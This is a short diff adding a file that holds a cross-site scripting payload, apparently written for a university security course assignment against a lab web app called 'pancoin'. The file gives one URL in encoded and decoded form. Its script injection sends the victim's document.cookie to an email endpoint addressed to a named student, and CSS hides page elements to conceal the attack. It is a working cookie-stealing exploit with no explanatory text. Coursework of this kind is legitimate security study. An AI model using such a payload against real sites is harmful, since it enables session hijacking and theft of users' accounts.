@@ -1,0 +1,6 @@
+https://mathlab.utsc.utoronto.ca/courses/cscd27f15/rosselet/asn/a3/pancoin/users.php?%20user=%22%3E%3Cscript%3E(new%20Image()).src=%22https://mathlab.utsc.utoronto.ca/courses/cscd27f15/rosselet/asn/a3/pancoin/email.php?to=maoting.zhang@mail.utoronto.ca%26body=%22%2Bdocument.cookie;%3C/script%3E%3Cstyle%3E%23baduser{visibility:hidden}%20%23pancoins{visibility:hidden}%3C/style%3E%3Cspan%20id=%22
+
+
+decoded version:
+
+https://mathlab.utsc.utoronto.ca/courses/cscd27f15/rosselet/asn/a3/pancoin/users.php? user="><script>(new Image()).src="https://mathlab.utsc.utoronto.ca/courses/cscd27f15/rosselet/asn/a3/pancoin/email.php?to=maoting.zhang@mail.utoronto.ca&body="+document.cookie;</script><style>#baduser{visibility:hidden} #pancoins{visibility:hidden}</style><span id="
